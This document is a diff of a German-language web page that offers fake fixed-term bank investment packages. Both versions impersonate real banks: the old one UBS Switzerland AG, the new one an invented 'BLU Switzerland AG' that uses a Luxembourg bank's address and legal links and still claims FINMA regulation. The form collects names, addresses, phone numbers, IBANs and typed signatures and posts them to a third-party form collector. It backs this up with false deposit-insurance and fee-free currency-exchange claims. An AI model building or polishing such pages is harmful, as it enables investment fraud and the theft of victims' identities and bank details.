@@ -1,13 +1,15 @@
 <!DOCTYPE html>
 <html lang="de">
 <head>
-  <meta charset="UTF-8">
-  <title>UBS Anlagepakete</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>BLU Anlagepakete</title>
   <style>
     body {
       font-family: Arial, sans-serif;
       background: #f5f5f5;
       margin: 0;
+      color: #333;
     }
 
     .container {
@@ -16,18 +18,18 @@
       padding: 40px 20px;
     }
 
-    .ubs-info-block {
+    .BLU-info-block {
       display: flex;
       align-items: center;
       gap: 20px;
       margin-bottom: 30px;
     }
 
-    .ubs-info-block img {
+    .BLU-info-block img {
       height: 50px;
     }
 
-    .ubs-info-text {
+    .BLU-info-text {
       font-size: 16px;
       line-height: 1.6;
     }
@@ -43,7 +45,7 @@
       border: 1px solid #ddd;
       border-radius: 10px;
       padding: 20px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
     }
 
     .card p {
@@ -62,6 +64,10 @@
       margin-top: 10px;
     }
 
+    .btn:hover {
+      background-color: #ae8f69;
+    }
+
     .modal {
       display: none;
       position: fixed;
@@ -69,7 +75,7 @@
       left: 0;
       width: 100vw;
       height: 100vh;
-      background: rgba(0,0,0,0.6);
+      background: rgba(0, 0, 0, 0.6);
       justify-content: center;
       align-items: center;
       z-index: 1000;
@@ -77,11 +83,11 @@
 
     .modal-content {
       background: white;
-      width: 80%;
+      width: 90%;
       max-width: 960px;
       padding: 30px;
       border-radius: 10px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
       overflow-y: auto;
       max-height: 90vh;
       position: relative;
@@ -98,84 +104,55 @@
       color: #999;
     }
 
-    .ubs-header {
-      display: flex;
-      align-items: center;
-      gap: 15px;
-      margin-bottom: 10px;
-    }
-
-    .ubs-header img {
-      height: 45px;
-    }
-
-    .modal-header-info {
-      display: flex;
-      justify-content: space-between;
-      align-items: flex-start;
-      margin-bottom: 20px;
-    }
-
-    .vertrag-block {
-      border: 1px solid #ccc;
-      background: #f9f9f9;
-      padding: 20px;
-      border-radius: 10px;
-      margin-bottom: 20px;
-      max-height: 180px;
-      overflow-y: auto;
-    }
-
     .paket-box {
-      background: #fff;
-      border: 1px solid #ccc;
-      padding: 15px;
+      background-color: #fdf8ed;
+      border-left: 4px solid #c1a57c;
+      padding: 16px 20px;
       border-radius: 10px;
-      font-size: 14px;
+      font-size: 15px;
+      color: #333;
+      line-height: 1.6;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+      flex: 1 1 48%;
     }
 
     .paket-box p {
-      margin: 4px 0;
+      margin: 6px 0;
     }
 
-    .green {
-      color: green;
+    .paket-box .green {
+      color: #008800;
       font-weight: bold;
+      display: flex;
+      align-items: center;
+      gap: 6px;
     }
 
-    form label {
-      font-weight: bold;
-      display: block;
-      margin-top: 15px;
+    .paket-box .green::before {
+      content: "✔";
+      color: #008800;
     }
 
-    input[type="text"], input[type="email"] {
-      width: 100%;
-      padding: 10px;
-      margin-top: 5px;
-      border-radius: 6px;
-      border: 1px solid #ccc;
+    .vertrag-text-box {
+      background-color: #eef4ff;
+      border-left: 4px solid #3c79d8;
+      padding: 16px 20px;
+      border-radius: 10px;
+      font-size: 15px;
+      color: #2b2b2b;
+      line-height: 1.6;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+      flex: 1 1 48%;
     }
 
-    .checkboxes label {
-      font-weight: normal;
-      display: block;
-      margin-top: 10px;
+    .vertrag-box-wrapper {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 20px;
+      margin: 20px 0;
     }
 
-    button[type="submit"] {
-      margin-top: 20px;
-      background: #c1a57c;
-      color: white;
-      padding: 12px 20px;
-      border: none;
-      border-radius: 6px;
-      width: 100%;
-      font-size: 16px;
-      cursor: pointer;
-    }
-
-    .site-footer {
+    footer.site-footer {
       background: #f7f7f7;
       padding: 20px 0;
       border-top: 1px solid #ddd;
@@ -215,18 +192,129 @@
     .footer-copy {
       margin: 10px 0 0;
     }
+
+    #bookingForm {
+      max-width: 720px;
+      margin: 40px auto 0;
+      padding: 32px;
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
+    }
+
+    .form-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 16px;
+      margin-bottom: 20px;
+    }
+
+    .form-group {
+      flex: 1;
+      min-width: 240px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .form-group label {
+      font-weight: 600;
+      margin-bottom: 6px;
+      font-size: 14px;
+    }
+
+    .form-group input {
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+      background: #f9f9f9;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    .form-group input:focus {
+      outline: none;
+      border-color: #c1a57c;
+      box-shadow: 0 0 0 2px rgba(193, 165, 124, 0.2);
+      background: #fff;
+    }
+
+    .form-group input::placeholder {
+      color: #999;
+    }
+
+    .checkboxes {
+      margin: 24px 0;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .checkboxes label {
+      display: flex;
+      align-items: flex-start;
+      font-size: 14px;
+      gap: 8px;
+      line-height: 1.4;
+    }
+
+    .abwicklung-info {
+      background-color: #fff8e1;
+      border-left: 4px solid #c1a57c;
+      padding: 12px 16px;
+      font-size: 13px;
+      color: #444;
+      border-radius: 6px;
+      margin-top: 12px;
+      line-height: 1.5;
+    }
+
+    #bookingForm button[type="submit"] {
+      width: 100%;
+      padding: 14px;
+      background-color: #c1a57c;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background-color 0.2s, transform 0.1s;
+    }
+
+    #bookingForm button[type="submit"]:hover {
+      background-color: #ae8f69;
+    }
+
+    #bookingForm button[type="submit"]:active {
+      transform: scale(0.98);
+    }
+
+    @media (max-width: 768px) {
+      .vertrag-box-wrapper {
+        flex-direction: column;
+      }
+
+      .form-row {
+        flex-direction: column;
+      }
+    }
+    #signature {
+  font-family: 'Segoe UI', sans-serif;
+  font-style: italic;
+}
+
   </style>
 </head>
 <body>
 
 <div class="container">
-  <div class="ubs-info-block">
-    <img src="https://github.com/securedigitalkonto/kundename/blob/main/logo1.png?raw=true" alt="UBS Logo">
-    <div class="ubs-info-text">
-      <strong>UBS Switzerland AG</strong><br>
-      Bahnhofstrasse 45 – Postfach 8001 Zürich, Schweiz<br>
-      Handelsregisternr.: CH-020.3.041.020-3<br>
-      MwSt.-Nr.: CHE-412.669.376 MWST<br>
+  <div class="BLU-info-block">
+    <img src="https://raw.githubusercontent.com/anlageprozess/blu/refs/heads/main/blu.png" alt="BLU Logo">
+    <div class="BLU-info-text">
+      <strong>BLU Switzerland AG</strong><br>
+      14, boulevard Royal L‑2449 Luxembourg<br>
+      Handelsregisternr.: B 5310<br>
+      MwSt.-Nr.: LU 105 902 81<br>
       Reguliert durch die FINMA
     </div>
   </div>
@@ -234,49 +322,77 @@
   <div class="paket-grid" id="paketGrid"></div>
 </div>
 
-<!-- Modal -->
 <div class="modal" id="modal">
   <div class="modal-content">
     <button class="close-btn" onclick="closeModal()">&times;</button>
+    <div class="vertrag-box-wrapper" id="vertragText"></div>
 
-    <div class="ubs-header">
-      <img src="https://raw.githubusercontent.com/anlageprozess/UBS/refs/heads/main/blu.png" alt="UBS Logo">
-      <div>
-        <strong>UBS Switzerland AG</strong><br>
-        Bahnhofstrasse 45 – Postfach 8001 Zürich, Schweiz<br>
-        Handelsregisternr.: CH-020.3.041.020-3<br>
-        MwSt.-Nr.: CHE-412.669.376 MWST<br>
-        Reguliert durch die FINMA
+    <form id="bookingForm" action="https://formcarry.com/s/-CsD5gMEu2x" method="POST" accept-charset="UTF-8">
+      <input type="hidden" name="paket" id="paketInput">
+      <form id="bookingForm" action="https://formcarry.com/s/3Izr5Sl7iQo" method="POST" accept-charset="UTF-8">
+      <div class="form-row">
+        <div class="form-group">
+          <label for="name">Vor- und Nachname *</label>
+          <input type="text" id="name" name="name" placeholder="Max Mustermann" required>
+        </div>
+        <div class="form-group">
+          <label for="email">E‑Mail-Adresse *</label>
+          <input type="email" id="email" name="email" placeholder="max@beispiel.de" required>
+        </div>
       </div>
-    </div>
 
-    <div class="modal-header-info">
-      <div></div>
-      <div style="text-align:right">
-        <strong>Anlagevertrag</strong><br>
-        Vertragsnummer: <em>[automatisch]</em>
+      <div class="form-row">
+        <div class="form-group">
+          <label for="phone">Telefon *</label>
+          <input type="tel" id="phone" name="phone" placeholder="+49 123 4567890" required>
+        </div>
+        <div class="form-group">
+          <label for="referenceAccount">Referenzkonto für Auszahlung *</label>
+          <input type="text" id="referenceAccount" name="referenceAccount" placeholder="IBAN DE00 ..." required>
+        </div>
       </div>
-    </div>
 
-    <div class="vertrag-block" id="vertragText"></div>
-    <div class="paket-box" id="paketBox"></div>
+      <div class="form-row">
+        <div class="form-group">
+          <label for="street">Straße *</label>
+          <input type="text" id="street" name="street" placeholder="Musterstraße 1" required>
+        </div>
+        <div class="form-group">
+          <label for="city">Stadt *</label>
+          <input type="text" id="city" name="city" placeholder="Musterstadt" required>
+        </div>
+      </div>
 
-    <form id="bookingForm" action="https://formcarry.com/s/3Izr5Sl7iQo" method="POST" accept-charset="UTF-8">
-      <label>Vor- und Nachname</label>
-      <input type="text" name="name" required>
-
-      <label>E-Mail-Adresse</label>
-      <input type="email" name="email" required>
+      <div class="form-row">
+        <div class="form-group">
+          <label for="postalCode">PLZ *</label>
+          <input type="text" id="postalCode" name="postalCode" placeholder="12345" required>
+        </div>
+        <div class="form-group">
+          <label for="country">Land *</label>
+          <input type="text" id="country" name="country" placeholder="Deutschland" required>
+        </div>
+      </div>
 
       <div class="checkboxes">
-        <label><input type="checkbox" name="konditionen" required> Ich buche dieses Paket mit den genannten Konditionen.</label>
-        <label><input type="checkbox" name="einverstanden" required> Ich habe den Vertragstext gelesen und bin einverstanden.</label>
+        <label><input type="checkbox" name="pep" required> Ich bin KEINE politisch exponierte Person *</label>
+        <label><input type="checkbox" name="agb" required> AGB akzeptiert *</label>
+        <label><input type="checkbox" name="kostenfrei" required> Keine Kontoführungsgebühren *</label>
+        <label><input type="checkbox" name="kontoeroeffnung" required> Kontoeröffnung bestätigt *</label>
+        <label><input type="checkbox" name="abwicklung" required> Abwicklung über Ribex/IncoreBank *</label>
+<p class="abwicklung-info">
+  Für eine gesetzeskonforme und zugleich effiziente Abwicklung erfolgt der Währungswechsel über Ribex in Zusammenarbeit mit der IncoreBank mit Sitz in Zürich, die in diesem Prozess als technischer Abwicklungspartner fungiert. Diese Struktur ermöglicht einen verlust- und gebührenfreien Währungstausch zwischen CHF und EUR – sowohl in der Hin- als auch in der Rückrichtung – ohne Kursdifferenzen oder versteckte Umrechnungsgebühren.
+</p>
+
+<div class="form-group" style="margin-top: 16px;">
+  <label for="signature">Unterschrift *</label>
+  <input type="text" id="signature" name="signature" placeholder="Max Mustermann" required>
+</div>
       </div>
 
-      <!-- Hidden field for selected package -->
       <input type="hidden" name="paket" id="paketInput">
-
       <button type="submit">Vertrag absenden</button>
+    </form>
     </form>
   </div>
 </div>
@@ -284,29 +400,28 @@
 <footer class="site-footer">
   <div class="footer-container">
     <ul class="footer-links">
-      <li><a href="http://bit.ly/411Y6nO">Impressum</a></li>
-      <li><a href="http://bit.ly/411Y6nO">Datenschutz</a></li>
-      <li><a href="http://bit.ly/411Y6nO">AGB</a></li>
-      <li><a href="https://anlageprozess.github.io/anlageoption/support.html">Kontakt</a></li>
+      <li><a href="https://www.banquedeluxembourg.com/en/bank/bl/legal-information">Impressum</a></li>
+      <li><a href="https://www.banquedeluxembourg.com/en/bank/bl/legal-information">Datenschutz</a></li>
+      <li><a href="https://www.banquedeluxembourg.com/en/bank/bl/legal-information">AGB</a></li>
+      <li><a href="https://www.banquedeluxembourg.com/en/bank/bl/legal-information">Kontakt</a></li>
     </ul>
-    <p class="footer-copy">© UBS Switzerland AG 2025. Alle Rechte vorbehalten.</p>
+    <p class="footer-copy">© BLU Switzerland AG 2025. Alle Rechte vorbehalten.</p>
   </div>
 </footer>
 
 <script>
   const pakete = [
-    { name: "UBS Silber", laufzeit: "12 Monate", zinssatz: 3.75, betrag: 100000 },
-    { name: "UBS Bronze", laufzeit: "6 Monate", zinssatz: 3.95, betrag: 50000 },
-    { name: "UBS Gold", laufzeit: "24 Monate", zinssatz: 3.55, betrag: 50000 },
-    { name: "UBS Premium", laufzeit: "36 Monate", zinssatz: 4.10, betrag: 200000 },
-    { name: "UBS MaxFlex", laufzeit: "12 Monate", zinssatz: 3.50, betrag: 50000 },
-    { name: "UBS Tagesgeld Plus", laufzeit: "täglich verfügbar", zinssatz: 2.25, betrag: 50000 }
+    { name: "BLU Silber", laufzeit: "12 Monate", zinssatz: 3.75, betrag: 100000 },
+    { name: "BLU Bronze", laufzeit: "12 Monate", zinssatz: 3.25, betrag: 50000 },
+    { name: "BLU Gold", laufzeit: "24 Monate", zinssatz: 3.55, betrag: 50000 },
+    { name: "BLU Premium", laufzeit: "36 Monate", zinssatz: 4.10, betrag: 200000 },
+    { name: "BLU MaxFlex", laufzeit: "12 Monate", zinssatz: 3.50, betrag: 50000 },
+    { name: "BLU Tagesgeld Plus", laufzeit: "täglich verfügbar", zinssatz: 2.25, betrag: 50000 }
   ];
 
   const grid = document.getElementById("paketGrid");
   const modal = document.getElementById("modal");
   const vertragText = document.getElementById("vertragText");
-  const paketBox = document.getElementById("paketBox");
   const paketInput = document.getElementById("paketInput");
 
   pakete.forEach((p, i) => {
@@ -329,33 +444,22 @@
     const zinsertrag = ((p.betrag * p.zinssatz) / 100).toFixed(2).replace(".", ",");
 
     vertragText.innerHTML = `
-      <h4>§ 1 Vertragsgegenstand</h4>
-      <p>(1) Die Bank nimmt vom Anleger eine Anlagesumme in Höhe von <strong>${p.betrag.toLocaleString('de-DE')} EUR</strong> entgegen.</p>
-      <p>(2) Die Laufzeit beträgt <strong>${p.laufzeit}</strong>.</p>
-      <p>(3) Der Zinssatz beträgt <strong>${p.zinssatz} %</strong> pro Jahr. Die zu erwartende Rendite beläuft sich auf <strong>${zinsertrag} EUR</strong>.</p>
-      <h4>§ 2 Verfügbarkeit</h4>
-      <p>Das Kapital ist für die Laufzeit gebunden.</p>
-      <h4>§ 3 Einlagensicherung</h4>
-      <p>Die Einlage ist bis 100.000 CHF durch das eidgenössische Einlagensicherungssystem geschützt.</p>
-      <h4>§ 4 Datenschutz</h4>
-      <p>Alle Daten werden gemäß DSGVO behandelt und nicht an Dritte weitergegeben.</p>
-      <h4>§ 5 Widerrufsrecht</h4>
-      <p>Sie können diesen Vertrag innerhalb von 14 Tagen ohne Angabe von Gründen widerrufen.</p>
+      <div class="vertrag-text-box">
+        <h3>Vertrag für ${p.name}</h3>
+        <p>Sie investieren <strong>${p.betrag.toLocaleString('de-DE')} EUR</strong> für eine Laufzeit von <strong>${p.laufzeit}</strong> zu einem Zinssatz von <strong>${p.zinssatz}%</strong>. Ihr Zinsertrag beträgt voraussichtlich <strong>${zinsertrag} EUR</strong>.</p>
+      </div>
+      <div class="paket-box">
+        <p><strong>${p.name}</strong></p>
+        <p><strong>Laufzeit:</strong> ${p.laufzeit}</p>
+        <p><strong>Zinssatz:</strong> ${p.zinssatz} %</p>
+        <p><strong>Anlagebetrag:</strong> ${p.betrag.toLocaleString('de-DE')} EUR</p>
+        <p><strong>Zinsertrag:</strong> ${zinsertrag} EUR</p>
+        <p class="green">Einlagensicherung: bis 100.000 CHF</p>
+        <p class="green">Keine Wechselkursgebühren</p>
+      </div>
     `;
 
-    paketBox.innerHTML = `
-      <p><strong>${p.name}</strong></p>
-      <p><strong>Laufzeit:</strong> ${p.laufzeit}</p>
-      <p><strong>Zinssatz:</strong> ${p.zinssatz} %</p>
-      <p><strong>Anlagebetrag:</strong> ${p.betrag.toLocaleString('de-DE')} EUR</p>
-      <p><strong>Zinsertrag:</strong> ${zinsertrag} EUR</p>
-      <p class="green">✔ Einlagensicherung: bis 100.000 CHF</p>
-      <p class="green">✔ Keine Wechselkursgebühren</p>
-    `;
-
-    // Send selected package to Formcarry
     paketInput.value = p.name;
-
     modal.style.display = "flex";
   }
 
